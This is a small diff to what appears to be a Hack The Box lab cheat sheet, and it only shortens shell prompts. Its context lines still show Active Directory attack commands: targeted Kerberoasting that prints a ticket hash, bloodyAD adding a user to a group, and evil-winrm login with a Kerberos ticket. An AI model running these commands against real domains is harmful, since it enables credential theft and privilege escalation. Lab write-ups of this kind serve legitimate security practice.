@@ -106,7 +106,7 @@ evil-winrm -i dc.domain.htb -k userticket.ccache -r REALM.htb  # with ticket aut
 
 **WriteSPN**
 ```bash
-┌──(.venv)─(mdn0x㉿mdn0xKali)-[~/…/Machines/TombWatcher/user/targetedKerberoast]
+┌──(.venv)─(mdn0x㉿mdn0xKali)
 └─$ python3 targetedKerberoast.py -v -d domain.htb -u user -p 'passwd'
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
@@ -120,7 +120,7 @@ $krb5tgs$23$*user2$DOMAIN.HTB$machine.htb/User2*$0e83983aba480c3219b96987f20b128
 
 **AddSelf**
 ```bash
-┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TombWatcher/user]
+┌──(mdn0x㉿mdn0xKali)
 └─$ bloodyAD --host '10.10.11.xx' -d 'domain.htb' -u user -p 'passwd' add groupMember GROUP alfred
 [+] user added to GROUP
 ```
